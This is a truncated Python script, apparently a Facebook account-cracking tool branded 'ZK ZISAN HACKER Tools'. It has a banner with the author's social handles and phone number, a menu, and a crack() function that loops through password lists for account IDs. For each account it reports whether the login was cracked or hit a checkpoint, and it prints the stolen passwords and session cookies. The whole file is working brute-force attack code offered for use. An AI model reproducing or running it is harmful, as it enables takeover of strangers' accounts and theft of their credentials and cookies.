...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mZK-ZISAN ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • ZK ZISAN HACKER ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mZK-ZISAN- HACKER  ]   ║\33[1;34m   
╠══[Whatsapp                 • 01887346168]  ║\33[1;35m 
╠══[TOOLS                    • FREE ]         ║ \33[1;32m   
...
os.system('espeak -a 300 " Welcome,   to,ZK  ZISAN,  HACKER,  Tools"')
pass
...
def menu():
    ...
    if ARIF in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801887346168')
        os.system("python nono.py")
    elif ARIF in ['3','03']:
        result()
    elif ARIF in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[ARIF•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[ARIF-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[ZISAN-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " ZISAN,  Ok,  id"')
